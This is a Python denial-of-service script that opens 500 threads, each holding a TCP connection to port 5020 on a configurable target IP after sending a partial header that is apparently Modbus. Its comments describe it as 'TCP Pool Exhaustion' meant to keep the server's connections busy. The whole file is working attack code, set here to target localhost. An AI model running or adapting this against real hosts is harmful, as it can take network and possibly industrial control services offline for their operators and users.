import socket
import threading
import time

# CONFIGURATION
TARGET_IP = '127.0.0.1'
TARGET_PORT = 5020

def attack():
    try:
        # Create a raw socket connection
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((TARGET_IP, TARGET_PORT))
        
        # Send a partial header to keep the socket "busy" but open (we don't send a full request, just enough to annoy the server)
        s.send(b"\x00\x01\x00\x00\x00\x06\x01") 
        
        print(f" -> Connection locked on {TARGET_PORT}")
        
        # Keep the connection open forever
        while True:
            time.sleep(10)
            
    except Exception as e:
        pass # Ignore errors, just keep attacking

print(f"[*] Starting TCP Pool Exhaustion (DoS) on {TARGET_IP}")

# Launch 500 parallel threads to flood the server
for i in range(500):
    t = threading.Thread(target=attack)
    t.start()
    time.sleep(0.01) # Small delay to prevent crashing my own PC